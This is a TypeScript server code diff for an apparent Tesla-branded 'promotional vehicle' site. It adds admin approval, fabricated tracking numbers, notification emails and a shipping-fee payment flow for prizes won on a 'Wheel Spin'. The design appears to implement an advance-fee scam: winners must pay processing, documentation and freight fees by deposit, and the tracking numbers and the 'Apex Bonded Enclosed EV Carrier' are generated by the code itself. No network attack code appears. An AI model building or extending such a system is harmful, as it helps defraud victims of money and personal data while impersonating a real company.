+    Boolean(existing.paymentVerifiedByAdmin) !== Boolean(updated.paymentVerifiedByAdmin);
+  const trackingChanged = (existing.trackingNumber || '') !== (updated.trackingNumber || '');
+
+  if (!statusChanged && !approvalChanged && !paymentVerificationChanged && !trackingChanged) {
+    return { notification: null, emailDispatch: null };
+  }
+
+  const statusLabel = formatWonPrizeStatusLabel(updated.shippingStatus);
+  const trackText = updated.trackingNumber ? `Tracking #: ${updated.trackingNumber}` : 'Tracking pending assignment';
+  const carrierText = updated.carrierName || 'Apex Bonded Enclosed EV Carrier';
+  const paymentText = updated.paymentVerifiedByAdmin ? 'Payment Verified & Received' : 'Payment Verification Pending';
+
+  const notification = {
+    id: `notif-ship-${Date.now()}-${Math.random().toString(36).slice(2, 6)}`,
+    title: `Shipment Status Updated (${statusLabel}): ${updated.title}`,
+    message: `Your won vehicle shipment is now "${statusLabel}". ${paymentText}. ${trackText} via ${carrierText}.${note ? ` Note: ${note}` : ''}`,
+    type: 'system',
+    priority: 'high',
+    targetType: 'individual',
+    targetUserId: updated.userId,
+    targetUserEmail: updated.userEmail,
+    targetUserName: updated.userName,
+    createdAt: new Date().toISOString().replace('T', ' ').substring(0, 16),
+    readBy: [],
+    dismissedBy: [],
+    actionUrl: 'dashboard',
+    actionLabel: updated.trackingNumber ? 'Track Shipment' : 'View Pending Shipments',
+    category: 'won_vehicle_shipment',
+  };
+
+  serverUserNotifications.unshift(notification);
+  if (serverUserNotifications.length > 200) {
+    serverUserNotifications.length = 200;
+  }
+  persistServerGameAndCronState();
+
+  let emailDispatch: {
+    status: 'delivered' | 'simulated' | 'failed';
+    recipient: string;
+    messageId: string;
+    detail: string;
+  } | null = null;
+
+  const recipientEmail = String(updated.userEmail || '').trim();
+  if (recipientEmail && recipientEmail.includes('@')) {
+    try {
+      const mailRes = await sendWonVehicleShipmentNotificationEmail({
+        recipientEmail,
+        recipientName: updated.userName,
+        prizeId: updated.id,
+        vehicleTitle: updated.title,
+        vinAssigned: updated.vinAssigned,
+        trackingNumber: updated.trackingNumber,
+        carrierName: carrierText,
+        shippingStatus: updated.shippingStatus,
+        statusLabel,
+        paymentVerified: Boolean(updated.paymentVerifiedByAdmin),
+        adminEmail: callerEmail,
+        note,
+      });
+
+      emailDispatch = {
+        status: mailRes.status,
+        recipient: recipientEmail,
+        messageId: mailRes.messageId,
+        detail: mailRes.detail,
+      };
+
+      serverDispatchedEmails.unshift({
+        id: mailRes.logEntry.id,
+        type: 'won_vehicle_shipment_update',
+        recipient: recipientEmail,
+        subject: mailRes.logEntry.subject,
+        amountUsd: Number(updated.totalFeesUsd || 0),
+        investmentId: updated.id,
+        certificateId: updated.trackingNumber || updated.id,
+        dispatchedAt: mailRes.logEntry.dispatchedAt,
+        status: mailRes.status === 'delivered' ? 'delivered' : 'simulated',
+      });
+      if (serverDispatchedEmails.length > 50) {
+        serverDispatchedEmails.length = 50;
+      }
+    } catch (err: any) {
+      console.error('[WonPrize Mailer] Failed sending shipment update email:', err?.message || err);
+    }
+  }
+
+  return { notification, emailDispatch };
+}
+
+app.put('/api/won-prizes/:id', authenticateToken, requireAdmin, async (req, res) => {
   const { id } = req.params;
   const existing = serverWonPrizes.get(id);
   if (!existing) {
     return res.status(404).json({ error: 'Won prize record not found.' });
   }
   const updates = req.body || {};
+  const callerEmail = (req as any).user?.email || 'admin.ops@apex-tesla.io';
+  const nowIso = new Date().toISOString();
+
   const p = Number(updates.processingFeeUsd ?? existing.processingFeeUsd ?? 0) || 0;
   const d = Number(updates.shippingDocFeeUsd ?? existing.shippingDocFeeUsd ?? 0) || 0;
   const f = Number(updates.shippingFreightFeeUsd ?? existing.shippingFreightFeeUsd ?? 0) || 0;
+
+  const validStatuses = [
+    'awaiting_details',
+    'fees_paid_processing',
+    'approved',
+    'documentation_ready',
+    'shipped',
+    'delivered',
+  ];
+  const requestedStatus =
+    typeof updates.shippingStatus === 'string' && validStatuses.includes(updates.shippingStatus)
+      ? updates.shippingStatus
+      : existing.shippingStatus;
+
+  const approvedByStatus =
+    requestedStatus === 'approved' ||
+    requestedStatus === 'documentation_ready' ||
+    requestedStatus === 'shipped' ||
+    requestedStatus === 'delivered';
+
+  const isApproved =
+    updates.adminApprovedForShipment !== undefined
+      ? Boolean(updates.adminApprovedForShipment)
+      : Boolean(existing.adminApprovedForShipment || approvedByStatus);
+
+  const nextFeesPaid =
+    updates.feesPaid !== undefined
+      ? Boolean(updates.feesPaid)
+      : Boolean(existing.feesPaid || (isApproved && updates.paymentVerifiedByAdmin));
+
+  const isVerified =
+    updates.paymentVerifiedByAdmin !== undefined
+      ? Boolean(updates.paymentVerifiedByAdmin)
+      : Boolean(existing.paymentVerifiedByAdmin || (isApproved && nextFeesPaid));
+
+  let assignedTracking: string | undefined;
+  if (updates.trackingNumber !== undefined) {
+    const manualTrack = String(updates.trackingNumber || '').trim();
+    assignedTracking = manualTrack || (isApproved ? `APX-EXP-${Date.now().toString(36).toUpperCase()}` : undefined);
+  } else {
+    assignedTracking = isApproved
+      ? String(existing.trackingNumber || '').trim() || `APX-EXP-${Date.now().toString(36).toUpperCase()}`
+      : existing.trackingNumber;
+  }
+
+  const nextCarrier =
+    updates.carrierName !== undefined
+      ? String(updates.carrierName || '').trim() || 'Apex Bonded Enclosed EV Carrier'
+      : existing.carrierName || 'Apex Bonded Enclosed EV Carrier';
+
+  const statusChanged = existing.shippingStatus !== requestedStatus || (!existing.adminApprovedForShipment && isApproved);
+  const existingCheckpoints = Array.isArray(existing.checkpoints) ? existing.checkpoints : [];
+  const nextCheckpoints = statusChanged
+    ? [
+        ...existingCheckpoints,
+        {
+          id: `chk-admin-upd-${Date.now().toString(36)}`,
+          status: requestedStatus,
+          title: `Shipment ${formatWonPrizeStatusLabel(requestedStatus)}`,
+          location: 'Apex Logistics & Title Verification Desk',
+          timestamp: nowIso.replace('T', ' ').substring(0, 16),
+          note: `Updated by ${callerEmail}. Payment Verified: ${isVerified ? 'Yes' : 'No'}.${
+            assignedTracking ? ` Tracking #: ${assignedTracking}` : ''
+          }${updates.notes ? ` Note: ${String(updates.notes)}` : ''}`,
+        },
+      ]
+    : existingCheckpoints;
+
   const updated = {
     ...existing,
     ...updates,
     id,
+    feesPaid: nextFeesPaid,
+    paidAt: nextFeesPaid ? existing.paidAt || nowIso : existing.paidAt,
     processingFeeUsd: p,
     shippingDocFeeUsd: d,
     shippingFreightFeeUsd: f,
     totalFeesUsd: Number((p + d + f).toFixed(2)),
+    shippingStatus: requestedStatus,
+    paymentVerifiedByAdmin: isVerified,
+    adminApprovedForShipment: isApproved,
+    verifiedAt: isVerified || isApproved ? existing.verifiedAt || nowIso : undefined,
+    verifiedByAdminEmail: isVerified || isApproved ? existing.verifiedByAdminEmail || callerEmail : undefined,
+    trackingNumber: assignedTracking,
+    carrierName: nextCarrier,
+    checkpoints: nextCheckpoints,
   };
+
   serverWonPrizes.set(id, updated);
   persistServerGameAndCronState();
-  return res.json({ success: true, prize: updated });
+
+  const { notification, emailDispatch } = await triggerWonPrizeShipmentNotifications({
+    existing,
+    updated,
+    callerEmail,
+    note: typeof updates.notes === 'string' ? updates.notes : undefined,
+  });
+
+  return res.json({
+    success: true,
+    prize: updated,
+    notification,
+    emailDispatch,
+    vehicleEligibility: checkUserVehicleWinEligibility(updated.userId, updated.userEmail),
+    promoProfile: getUserPromotionProfile(updated.userId, updated.userEmail),
+  });
+});
+
+app.post('/api/won-prizes/:id/approve-shipment', authenticateToken, requireAdmin, async (req, res) => {
+  const { id } = req.params;
+  const existing = serverWonPrizes.get(id);
+  if (!existing) {
+    return res.status(404).json({ error: 'Won prize record not found.' });
+  }
+  const {
+    trackingNumber,
+    carrierName,
+    shippingStatus = 'approved',
+    notes,
+    confirmPaymentVerified = true,
+  } = req.body || {};
+
+  if (!existing.feesPaid && !confirmPaymentVerified) {
+    return res.status(400).json({ error: 'Required shipping & processing fees must be paid or verified before approving shipment.' });
+  }
+
+  const callerEmail = (req as any).user?.email || 'admin.ops@apex-tesla.io';
+  const nowIso = new Date().toISOString();
+  const resolvedTracking =
+    String(trackingNumber || existing.trackingNumber || '').trim() ||
+    `APX-EXP-${Date.now().toString(36).toUpperCase()}`;
+  const resolvedCarrier =
+    String(carrierName || existing.carrierName || '').trim() ||
+    'Apex Bonded Enclosed EV Carrier';
+  const validStatuses = ['approved', 'documentation_ready', 'shipped', 'delivered'];
+  const nextStatus = validStatuses.includes(shippingStatus) ? shippingStatus : 'approved';
+
+  const existingCheckpoints = Array.isArray(existing.checkpoints) ? existing.checkpoints : [];
+  const nextCheckpoints = [
+    ...existingCheckpoints,
+    {
+      id: `chk-admin-app-${Date.now().toString(36)}`,
+      status: nextStatus,
+      title: `Payment Verified & Shipment ${formatWonPrizeStatusLabel(nextStatus)}`,
+      location: 'Apex Logistics & Title Verification Desk',
+      timestamp: nowIso.replace('T', ' ').substring(0, 16),
+      note: `Verified by ${callerEmail}. Assigned Tracking #: ${resolvedTracking} via ${resolvedCarrier}.`,
+    },
+  ];
+
+  const updated = {
+    ...existing,
+    feesPaid: true,
+    paidAt: existing.paidAt || nowIso,
+    addressConfirmed: Boolean(existing.addressConfirmed ?? existing.shippingAddress?.street),
+    paymentVerifiedByAdmin: Boolean(confirmPaymentVerified),
+    adminApprovedForShipment: true,
+    verifiedAt: nowIso,
+    verifiedByAdminEmail: callerEmail,
+    shippingStatus: nextStatus,
+    trackingNumber: resolvedTracking,
+    carrierName: resolvedCarrier,
+    checkpoints: nextCheckpoints,
+    notes: notes !== undefined ? String(notes) : (existing.notes || `Payment verified and approved for shipment (${resolvedTracking}).`),
+  };
+
+  serverWonPrizes.set(id, updated);
+  persistServerGameAndCronState();
+
+  const { notification, emailDispatch } = await triggerWonPrizeShipmentNotifications({
+    existing,
+    updated,
+    callerEmail,
+    note: typeof notes === 'string' ? notes : undefined,
+  });
+
+  return res.json({
+    success: true,
+    prize: updated,
+    notification,
+    emailDispatch,
+    vehicleEligibility: checkUserVehicleWinEligibility(updated.userId, updated.userEmail),
+    promoProfile: getUserPromotionProfile(updated.userId, updated.userEmail),
+  });
+});
+
+app.get('/api/tracking/:trackingNumber', authenticateToken, (req, res) => {
+  const caller = (req as any).user;
+  const queryTrack = String(req.params.trackingNumber || '').trim().toLowerCase();
+  if (!queryTrack) {
+    return res.status(400).json({ error: 'Tracking number is required.' });
+  }
+  const cleanEmail = caller?.email ? String(caller.email).trim().toLowerCase() : '';
+  const isAdmin = caller?.role === 'admin';
+  const isAlexAlias = caller?.id === 'usr-alex-001' || caller?.id === 'usr-apex-001';
+
+  for (const prize of serverWonPrizes.values()) {
+    if (!prize || !prize.trackingNumber) continue;
+    const isApproved =
+      Boolean(prize.adminApprovedForShipment) ||
+      prize.shippingStatus === 'approved' ||
+      prize.shippingStatus === 'documentation_ready' ||
+      prize.shippingStatus === 'shipped' ||
+      prize.shippingStatus === 'delivered';
+    if (!isApproved) continue;
+    if (String(prize.trackingNumber).trim().toLowerCase() === queryTrack) {
+      const owns =
+        isAdmin ||
+        prize.userId === caller?.id ||
+        (cleanEmail && prize.userEmail && String(prize.userEmail).trim().toLowerCase() === cleanEmail) ||
+        (isAlexAlias && (prize.userId === 'usr-alex-001' || prize.userId === 'usr-apex-001'));
+      if (!owns) {
+        return res.status(403).json({ error: 'You are not authorized to inspect this shipment tracking number.' });
+      }
+      return res.json({ success: true, type: 'won_prize', prize });
+    }
+  }
+  return res.status(404).json({ error: 'No approved shipment found for that tracking number.' });
 });
 
 app.delete('/api/won-prizes/:id', authenticateToken, requireAdmin, (req, res) => {
@@ -2881,6 +3453,21 @@ app.post('/api/won-prizes/pay-fees', authenticateToken, requireSelfOrAdmin, (req
 
   if (!userId || !prizeId) {
     return res.status(400).json({ error: 'userId and prizeId are required.' });
+  }
+
+  if (
+    !shippingAddress ||
+    !String(shippingAddress.fullName || '').trim() ||
+    !String(shippingAddress.country || '').trim() ||
+    !String(shippingAddress.street || '').trim() ||
+    !String(shippingAddress.city || '').trim() ||
+    !String(shippingAddress.zipCode || '').trim() ||
+    !String(shippingAddress.phone || '').trim()
+  ) {
+    return res.status(400).json({
+      error: 'Complete destination shipping address (fullName, country, street, city, zipCode, phone) is required before processing & shipping fees can be settled.',
+      code: 'SHIPPING_ADDRESS_INCOMPLETE',
+    });
   }
 
   const existingPrize = serverWonPrizes.get(prizeId);
@@ -2922,14 +3509,48 @@ app.post('/api/won-prizes/pay-fees', authenticateToken, requireSelfOrAdmin, (req
     });
   }
 
-  const prize = existingPrize || { id: prizeId, userId };
+  const nowIso = new Date().toISOString();
+  const prize = existingPrize || {
+    id: prizeId,
+    userId,
+    userName: (req as any).user?.name || shippingAddress.fullName || 'Apex Member',
+    userEmail: (req as any).user?.email || 'member@apex-tesla.io',
+    prizeType: 'vehicle',
+    title: '2026 Tesla Promotional Vehicle',
+    modelOrSku: 'Tesla EV',
+    image: '/promo-plaid.jpg',
+    estimatedValueUsd: 42490,
+    wonAt: getUtcDateKey(),
+    wonAtIso: nowIso,
+    source: 'Wheel Spin',
+    processingFeeUsd: 450,
+    shippingDocFeeUsd: 350,
+    shippingFreightFeeUsd: 1200,
+    totalFeesUsd: feeAmount,
+  };
   prize.feesPaid = true;
-  prize.paidAt = new Date().toISOString();
+  prize.paidAt = nowIso;
   prize.paymentMethod = 'deposit';
+  prize.addressConfirmed = true;
   prize.shippingAddress = shippingAddress;
   prize.shippingStatus = 'fees_paid_processing';
-  prize.trackingNumber = prize.trackingNumber || `APX-EXP-${Date.now().toString(36).toUpperCase()}`;
+  prize.paymentVerifiedByAdmin = false;
+  prize.adminApprovedForShipment = false;
+  // Tracking number is only issued once admin verifies payment and approves delivery/shipment
+  prize.trackingNumber = undefined;
   prize.carrierName = prize.carrierName || 'Apex Bonded Enclosed EV Carrier';
+  const prevCheckpoints = Array.isArray(prize.checkpoints) ? prize.checkpoints : [];
+  prize.checkpoints = [
+    ...prevCheckpoints,
+    {
+      id: `chk-user-paid-${Date.now().toString(36)}`,
+      status: 'fees_paid_processing',
+      title: 'Shipping Address Confirmed & Fees Submitted',
+      location: `${shippingAddress.city}, ${shippingAddress.country}`,
+      timestamp: nowIso.replace('T', ' ').substring(0, 16),
+      note: 'Deposit-verified fee payment submitted. Awaiting Admin payment verification & dispatch approval.',
+    },
+  ];
   serverWonPrizes.set(prizeId, prize);
   persistServerGameAndCronState();
 
@@ -2938,6 +3559,8 @@ app.post('/api/won-prizes/pay-fees', authenticateToken, requireSelfOrAdmin, (req
     prize,
     wallet: validation.wallet,
     audit: validation.audit,
+    vehicleEligibility: checkUserVehicleWinEligibility(userId, (req as any).user?.email),
+    promoProfile: getUserPromotionProfile(userId, (req as any).user?.email),
     signature: signLedgerPayload({ userId, prizeId, feeAmount, paidAt: prize.paidAt }),
   });
 });
